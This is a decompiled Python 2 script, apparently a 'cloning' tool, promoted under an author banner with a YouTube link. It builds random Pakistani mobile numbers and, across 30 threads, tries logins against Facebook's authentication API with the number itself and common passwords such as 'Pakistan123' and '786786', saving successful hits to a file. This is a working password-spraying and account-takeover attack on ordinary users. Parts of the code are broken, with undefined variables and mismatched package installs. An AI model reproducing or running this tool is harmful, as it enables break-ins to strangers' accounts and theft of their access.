# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Mar  1 2022, 15:43:44) 
# [GCC Android (7714059, based on r416183c1) Clang 12.0.8 (https://android.google
# Embedded file name: /sdcard/without.py
# Compiled at: 2022-03-27 15:46:09
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 krs.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = """ 
           
_ _    _ _   _          _____ _____  
      | | |  | | \ | |   /\   |_   _|  __ \ 
      | | |  | |  \| |  /  \    | | | |  | |
  _   | | |  | | . ` | / /\ \   | | | |  | |
 | |__| | |__| | |\  |/ ____ \ _| |_| |__| |
  \____/ \____/|_| \_/_/    \_\_____|_____/
====================================

AUTHOR   = JUNAEID AHMED
FACEBOOK = Junaeid Ahmed
GITHUB   = Junaeid420
YOUTUBE  = Top Gaming Rj

====================================
   
          """

numm = [
 5, 2, 5, 2, 2]

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo
    print '\x1b[1;93m[1]\x1b[1;92m SUBSCRIBE MY YOUTUBE CHANNAL'
    time.sleep(0.05)
    print '\x1b[1;93m[2]\x1b[1;92m EXIT '
    time.sleep(0.05)
    print '\x1b[1;93m[0]\x1b[1;92m BACK '
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;93m CHOOSE  : \x1b[1;92m')
    if peak == '':
        print '\x1b[1;97mFill In Correctly'
        pilih_login()
    elif peak == '1':
        os.system('xdg-open  https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        Zeek()


def Zeek():
    os.system('clear')
    print logo
    print '\x1b[1;92m[1] START CLONING \x1b[1;93m(No Login)'
    time.sleep(0.1)
    print '\x1b[1;92m[2] EXIT'
    time.sleep(0.1)
    print '\x1b[1;92m[0] BACK'
    time.sleep(0.1)
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;93m CHOOSE:\x1b[1;92m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92mEnter any Pakistan code Number'
        print '\x1b[1;92mFrom 1 to 49\n'
        try:
            c = raw_input('\x1b[1;93mCHOOSE : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 36 * '\x1b[1;93m='
    xxx = str(len(id))
    jalan('\x1b[1;92mTotal ids number: ' + xxx)
    jalan('\x1b[1;92mCode you choose: ' + c)
    jalan('\x1b[1;92mWait A While Start Cracking...')
    jalan('\x1b[1;92mTo Stop Process Press Ctrl+z')
    print 36 * '\x1b[1;93m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32m[KRS-OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[KRS-CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + nama + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[KRS-OK]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[KRS-CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'Pakistan123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[KRS-OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[KRS-CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'khan khan'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;32m[JAB-OK]  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[JAB-CP] ' + k + c + user + '  |  ' + pass4
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[KRS-OK]  ' + k + c + user + '  |  ' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[KRS-CP] ' + k + c + user + '  |  ' + pass5
                                cps = open('save/cloned.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;97m-'
    print 'Process Has Been Completed ...'
    print 'Total CP/Ok: ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Your Offline account Will Open after 7 days')
    print ''
    print '\n\n\n\n\x1b[1;97mThanks me later\n\x1b[1;97mFb\x1b[1;97mKASHIF KHAN'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
# okay decompiling /sdcard/without.pyc
